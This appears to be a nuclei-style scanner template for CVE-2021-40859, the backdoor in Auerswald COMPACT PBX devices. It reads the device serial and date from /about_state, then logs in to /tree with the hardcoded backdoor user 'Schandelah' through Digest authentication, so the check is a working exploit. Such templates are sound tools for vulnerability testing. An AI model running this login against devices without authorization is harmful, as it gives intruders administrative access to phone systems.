id: poc-yaml-auerswald-cve-2021-40859

info:
  name: poc-yaml-auerswald-cve-2021-40859
  author: Jarcis-cy(https://github.com/jarcis-cy)
  severity: critical
  tags: xray-converted,cve-2021-40859,ct-218047
  reference:
    - https://www.redteam-pentesting.de/en/advisories/rt-sa-2021-007/-auerswald-compact-multiple-backdoors

http:
  - raw:
      - |
        GET /about_state HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        part: body
        regex:
          - "serial.*?\\d+.,"
          - "date.+?20[0-9][0-9].,"
  - raw:
      - |
        GET /tree HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 401
  - raw:
      - |
        GET /tree HTTP/1.1
        Host: {{Hostname}}
        Authorization: Digest username="Schandelah", realm="Auerswald", nonce="{{nonce}}", uri="/tree", algorithm=MD5, response="{{respmd5}}", opaque="{{opaque}}", algorithm="MD5", qop=auth, nc=00000001, cnonce="{{cnonce}}"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "Servicetools"